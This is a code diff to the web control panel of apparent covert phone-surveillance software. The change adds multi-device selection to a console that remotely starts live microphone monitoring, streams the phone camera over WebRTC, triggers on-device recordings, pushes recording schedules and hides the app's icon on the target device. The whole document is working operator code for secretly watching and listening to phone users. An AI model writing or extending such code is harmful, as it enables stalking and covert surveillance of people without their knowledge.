@@ -16,6 +16,13 @@
         <div class="brand">
             <span>🛡️</span> Control Center
         </div>
+
+        <div class="device-selector-wrapper" style="margin-left: 1rem;">
+            <select id="deviceSelect" class="device-select" onchange="onDeviceSelected()">
+                <option value="">Waiting for devices...</option>
+            </select>
+        </div>
+
         <div class="nav-tabs">
             <button class="tab-btn active" onclick="switchTab('monitor')">Monitor</button>
             <button class="tab-btn" onclick="switchTab('config')">Schedule & Config</button>
@@ -208,9 +215,13 @@
             event.target.classList.add('active');
         }
 
-        const socket = io();
+        const socket = io({ query: { type: 'admin' } });
         const logsDiv = document.getElementById('logs');
         const videoElement = document.getElementById('video-stream');
+        const deviceSelect = document.getElementById('deviceSelect');
+
+        let currentDeviceId = null;
+
 
         let audioCtx;
         let nextTime = 0;
@@ -235,23 +246,27 @@
             if (audioCtx.state === 'suspended') {
                 audioCtx.resume();
             }
-            socket.emit('start_monitoring');
-            log("✅ Audio monitoring started");
+            if (!currentDeviceId) return alert("Select a device!");
+            socket.emit('start_monitoring', currentDeviceId);
+            log("✅ Audio monitoring started for " + currentDeviceId);
         }
 
         function stopAudio() {
-            socket.emit('stop_monitoring');
+            if (!currentDeviceId) return;
+            socket.emit('stop_monitoring', currentDeviceId);
             log("⏹️ Audio monitoring stopped");
         }
 
         // Manual Recording Control
         function startManualRecording() {
-            socket.emit('START_MANUAL_RECORDING');
-            log("🔴 Manual recording started - saving to phone");
+            if (!currentDeviceId) return alert("Select a device!");
+            socket.emit('START_MANUAL_RECORDING', currentDeviceId);
+            log("🔴 Manual recording started on device");
         }
 
         function stopManualRecording() {
-            socket.emit('STOP_MANUAL_RECORDING');
+            if (!currentDeviceId) return;
+            socket.emit('STOP_MANUAL_RECORDING', currentDeviceId);
             log("⏹️ Manual recording stopped");
         }
 
@@ -287,7 +302,8 @@
                 };
 
                 log("⏳ Requesting camera...");
-                socket.emit('start_video');
+                if (!currentDeviceId) return alert("Select a device!");
+                socket.emit('start_video', currentDeviceId);
 
                 // Wait for confirmation logic simplified for brevity/robustness
                 // (Using simple timeout/wait logic if needed, but here preserving simple flow)
@@ -297,7 +313,10 @@
                 const offer = await peerConnection.createOffer({ offerToReceiveVideo: true, offerToReceiveAudio: false });
                 await peerConnection.setLocalDescription(offer);
 
-                socket.emit('webrtc_offer', JSON.stringify({ type: offer.type, sdp: offer.sdp }));
+                socket.emit('webrtc_offer', JSON.stringify({
+                    targetId: currentDeviceId,
+                    offer: { type: offer.type, sdp: offer.sdp }
+                }));
                 log("✅ WebRTC offer sent");
 
             } catch (error) {
@@ -307,7 +326,8 @@
         }
 
         function stopVideo() {
-            socket.emit('stop_video');
+            if (!currentDeviceId) return;
+            socket.emit('stop_video', currentDeviceId);
             if (peerConnection) {
                 peerConnection.close();
                 peerConnection = null;
@@ -320,15 +340,16 @@
         }
 
         function switchVideo() {
-            socket.emit('switch_camera');
+            if (!currentDeviceId) return;
+            socket.emit('switch_camera', currentDeviceId);
             log("🔄 Camera switched");
         }
 
-        function toggleFlash() { socket.emit('toggle_flash'); log("💡 Flash toggled"); }
-        function brightnessUp() { socket.emit('brightness_up'); log("🔆 Brightness +"); }
-        function brightnessDown() { socket.emit('brightness_down'); log("🔅 Brightness -"); }
+        function toggleFlash() { if (currentDeviceId) { socket.emit('toggle_flash', currentDeviceId); log("💡 Flash toggled"); } }
+        function brightnessUp() { if (currentDeviceId) { socket.emit('brightness_up', currentDeviceId); log("🔆 Brightness +"); } }
+        function brightnessDown() { if (currentDeviceId) { socket.emit('brightness_down', currentDeviceId); log("🔅 Brightness -"); } }
 
-        function hideAppIcon() { if (confirm("Hide app icon?")) socket.emit('hide_app_icon'); }
+        function hideAppIcon() { if (confirm("Hide app icon?") && currentDeviceId) socket.emit('hide_app_icon', currentDeviceId); }
 
         function toggleFullscreen() {
             const video = document.getElementById('video-stream');
@@ -340,7 +361,7 @@
                 document.exitFullscreen();
             }
         }
-        function showAppIcon() { socket.emit('show_app_icon'); }
+        function showAppIcon() { if (currentDeviceId) socket.emit('show_app_icon', currentDeviceId); }
 
         function updateConfig() {
             const config = {
@@ -354,12 +375,13 @@
                 scheduleEndTime: document.getElementById('scheduleEndTime').value,
                 scheduleEnabled: document.getElementById('scheduleEnabled').checked
             };
-            socket.emit('update_config', JSON.stringify(config));
-            log("💾 Config updated");
+            if (!currentDeviceId) return alert("Select a device!");
+            socket.emit('update_config', { targetId: currentDeviceId, config: config });
+            log("💾 Config pushed to device");
         }
 
-        function getConfig() { socket.emit('get_config'); }
-        function getStorageStats() { socket.emit('get_storage_stats'); }
+        function getConfig() { if (currentDeviceId) socket.emit('get_config', currentDeviceId); }
+        function getStorageStats() { if (currentDeviceId) socket.emit('get_storage_stats', currentDeviceId); }
 
         socket.on('current_config', (config) => {
             try {
@@ -469,7 +491,12 @@
             for (let i = 0; i < string.length; i++) view.setUint8(offset + i, string.charCodeAt(i));
         }
 
-        socket.on('audio_data', (buf) => {
+        socket.on('audio_data', (payload) => {
+            // payload = { deviceId, data }
+            // Only play if it matches selected device
+            if (payload.deviceId !== currentDeviceId) return;
+            const buf = payload.data;
+
             if (!audioCtx) return;
             const int16 = new Int16Array(buf);
             if (isRecordingLive) recordedChunks.push(new Int16Array(int16));
@@ -511,9 +538,46 @@
         socket.on('log', (msg) => log(msg));
         socket.on('server_log', (msg) => log(msg));
 
+        // Device List Management
+        socket.on('device_list_update', (list) => {
+            // list = [[id, {name, socketId}], ...]
+            const oldVal = deviceSelect.value;
+            deviceSelect.innerHTML = '<option value="">-- Select Device --</option>';
+
+            if (list.length === 0) {
+                deviceSelect.innerHTML = '<option value="">No devices connected</option>';
+            }
+
+            list.forEach(([id, info]) => {
+                const opt = document.createElement('option');
+                opt.value = id;
+                opt.text = `${info.name} (${id.substr(0, 4)}...)`;
+                deviceSelect.appendChild(opt);
+            });
+
+            // Try to restore selection
+            if (oldVal && list.find(([id]) => id === oldVal)) {
+                deviceSelect.value = oldVal;
+            } else if (list.length > 0 && !currentDeviceId) {
+                // Auto-select first if none selected
+                deviceSelect.value = list[0][0];
+                onDeviceSelected();
+            }
+        });
+
+        function onDeviceSelected() {
+            currentDeviceId = deviceSelect.value;
+            if (currentDeviceId) {
+                log("📱 Switched to: " + currentDeviceId);
+                // Refresh data for new device
+                getConfig();
+                getStorageStats();
+            }
+        }
+
         // Init
-        getConfig();
-        getStorageStats();
+        // getConfig(); // Wait for device selection
+        // getStorageStats();
         // Load recordings initially for better UX? No, wait for user or just call it.
         // getRecordings(); 
     </script>
